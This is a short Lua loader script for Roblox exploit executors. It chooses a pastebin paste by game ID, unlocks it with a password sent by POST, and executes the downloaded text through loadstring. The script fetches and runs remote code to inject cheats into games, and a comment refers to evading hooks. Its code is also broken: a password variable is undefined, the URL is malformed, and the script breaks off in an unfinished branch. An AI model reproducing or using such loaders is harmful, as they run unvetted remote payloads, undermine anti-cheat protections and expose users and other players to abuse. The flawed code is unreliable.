local _G1 = "5zXcC7cK" -- Iron Man
local _G2 = "mCfftt2x" -- Strongest Battlegrounds
local _ID = game.PlaceId

--// Localizing functions to prevent hook-jumping
local _REQ = (syn and syn.request) or (http and http.request) or http_request or (Fluxus and Fluxus.request) or request
local _L = loadstring

if not _REQ then 
    warn("Executor not supported: Missing Request Function") 
    return 
end

local function _EXEC(_ID_STR)
    local _RES = _REQ({
        Url = "https://pastebin.com" .. _ID_STR,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/x-www-form-urlencoded"
        },
        Body = "PostPasswordVerificationForm[password]=" .. _P
    })

    if _RES and _RES.Body then
        local _S, _E = pcall(function()
            _L(_RES.Body)()
        end)
        if not _S then warn("Exec Error: " .. tostring(_E)) end
    end
end

--// Logic flow
if _ID == 16929212566 then
    _EXEC(_G1)
elseif _ID == 10449761463 then
    _EXEC(_G2)
else
